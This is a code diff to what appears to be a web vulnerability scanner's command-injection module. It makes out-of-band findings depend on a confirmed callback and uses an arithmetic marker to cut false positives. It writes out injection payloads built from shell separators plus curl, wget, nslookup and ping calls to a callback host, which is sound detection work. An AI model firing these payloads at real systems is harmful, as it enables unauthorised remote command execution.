@@ -87,33 +87,51 @@ class CommandInjectionModule(BaseModule):
             self._test_sqlmap_os(url, method, param, value)
 
     def _test_oob_cmdi(self, url: str, method: str, param: str, value: str):
-        """Test OOB command injection"""
-        oob = self.engine.config.get("oob_domain", "oob.callback.example.com")
+        """Test OOB command injection — only fires when the OOB callback
+        collector actually observed a hit. Prior logic reported on ANY
+        HTTP response, turning "we sent a probe" into a CRITICAL finding.
+        """
+        # Mirror the OOB contract used by sqli.py: only issue payloads when
+        # a real OOB listener is wired, and only report on an observed hit.
+        oob_manager = getattr(self.engine, "oob_manager", None)
+        if oob_manager is None or not getattr(oob_manager, "enabled", False):
+            return
+
+        token, callback_url = oob_manager.get_callback_url(
+            vuln_type="cmdi_oob", url=url, param=param,
+        )
+        if not token or not callback_url:
+            return
+        from urllib.parse import urlparse as _urlparse
+        cb_host = _urlparse(callback_url).hostname or token
+        dns_canary = oob_manager.get_dns_canary(token) or cb_host
+
         payloads = [
-            f"; nslookup {oob}",
-            f"| curl http://{oob}/",
-            f"$(wget http://{oob}/)",
+            f"{value}; nslookup {dns_canary}",
+            f"{value}| curl -s http://{cb_host}/{token}",
+            f"{value}$(wget -q -O- http://{cb_host}/{token})",
+            f"{value}`ping -c 1 {dns_canary}`",
         ]
         for payload in payloads:
             try:
-                data = {param: f"{value}{payload}"}
-                response = self.requester.request(url, method, data=data)
-                if response:
-                    from core.engine import Finding
-
-                    finding = Finding(
-                        technique="Command Injection (OOB Exfiltration)",
-                        url=url,
-                        severity="INFO",
-                        confidence=0.4,
-                        param=param,
-                        payload=payload,
-                        evidence=f"OOB payload sent — verify at {oob}",
-                    )
-                    self.engine.add_finding(finding)
-                    return
+                self.requester.request(url, method, data={param: payload})
             except Exception:
                 continue
+
+        hits = oob_manager.check(token, timeout=self.engine.config.get("oob_timeout", 10))
+        if not hits:
+            return
+
+        from core.engine import Finding
+        self.engine.add_finding(Finding(
+            technique="Command Injection (OOB confirmed)",
+            url=url,
+            severity="CRITICAL",
+            confidence=0.98,
+            param=param,
+            payload=f"OOB probe token={token}",
+            evidence=f"OOB collector recorded {len(hits)} callback(s) after CMDi payload — confirmed RCE",
+        ))
 
     def _test_argument_injection(self, url: str, method: str, param: str, value: str):
         """Test argument injection"""
@@ -319,18 +337,38 @@ class CommandInjectionModule(BaseModule):
             ("%3b", "url_semicolon"),
         ]
 
-        test_cmd = "echo cmdi_test_12345"
+        # Arithmetic marker: payload contains "expr 91125 * 37811"
+        # (or equivalent), and detection looks for the RESULT (3446517375)
+        # which never appears in the payload itself — defeats pure-reflection FPs.
+        _A, _B = 91125, 37811
+        _RESULT = str(_A * _B)  # "3446517375"
+        _PAYLOAD_CMD = f"expr {_A} \\* {_B}"
+
+        # Establish a baseline: does the unmodified value already echo the result?
+        # (Cache-poisoned pages, error strings containing large numbers, etc.)
+        try:
+            baseline = self.requester.request(url, method, data={param: value})
+            baseline_text = baseline.text if baseline is not None else ""
+        except Exception:
+            baseline_text = ""
+        if _RESULT in baseline_text:
+            return  # target already contains our marker — can't disambiguate
 
         for sep, sep_name in separators:
             try:
-                payload = f"{value}{sep}{test_cmd}"
+                payload = f"{value}{sep}{_PAYLOAD_CMD}"
                 data = {param: payload}
                 response = self.requester.request(url, method, data=data)
 
                 if response is None:
                     continue
 
-                if "cmdi_test_12345" in response.text:
+                # Real execution: result present AND payload literal absent
+                # (a raw echo of the payload would also contain _RESULT if the
+                # target reflects the string "91125 * 37811" but math doesn't
+                # happen server-side — so require the arithmetic OUTPUT and
+                # confirm the raw expression isn't just being echoed).
+                if _RESULT in response.text and _PAYLOAD_CMD not in response.text:
                     from core.engine import Finding
 
                     finding = Finding(
@@ -340,7 +378,7 @@ class CommandInjectionModule(BaseModule):
                         confidence=0.9,
                         param=param,
                         payload=payload,
-                        evidence=f"Command separator '{sep}' works",
+                        evidence=f"Command separator '{sep}' works — arithmetic marker {_RESULT} in response",
                     )
                     self.engine.add_finding(finding)
                     return
